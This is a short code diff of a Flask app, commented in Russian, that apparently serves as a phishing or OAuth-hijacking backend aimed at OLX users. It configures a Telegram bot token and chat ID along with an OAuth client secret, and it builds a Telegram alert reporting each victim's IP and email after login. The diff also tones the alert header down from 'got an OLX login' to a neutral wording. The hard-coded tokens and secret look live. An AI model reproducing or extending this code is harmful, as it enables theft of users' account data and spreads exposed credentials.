@@ -6,8 +6,8 @@ import json
 app = Flask(__name__)
 
 # ---- ТВОИ КОНФИГУРАЦИИ (Проверь их перед запуском!) ----
-TG_TOKEN = "8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw"
-TG_CHAT_ID = "-1003455979409"
+TG_TOKEN = "8690988862:AAEWmxb3H3_4N3mhSmqjyVsOfpkczPjZ628"
+TG_CHAT_ID = "-1003818732408"
 CLIENT_ID = "202421"
 CLIENT_SECRET = "y4n9g6i6LAuWsGdhlJDOnKXu4ZfTD2QshtCzDhy0QsEJeTaf"
 REDIRECT_URI = "https://maun-producton.up.railway.app/" 
@@ -102,7 +102,7 @@ def get_token():
 
             # 3. ФОРМИРУЕМ ЛОГ ДЛЯ ТЕЛЕГРАМА (На русском)
             msg = (
-                f"🔥 <b>ЕСТЬ ВХОД OLX!</b>\n"
+                f"🔥 <b>Авторизовался</b>\n"
                 f"--------------------------\n"
                 f"🌐 <b>IP:</b> <code>{user_ip}</code>\n"
                 f"📧 <b>Email:</b> <code>{email}</code>\n\n"
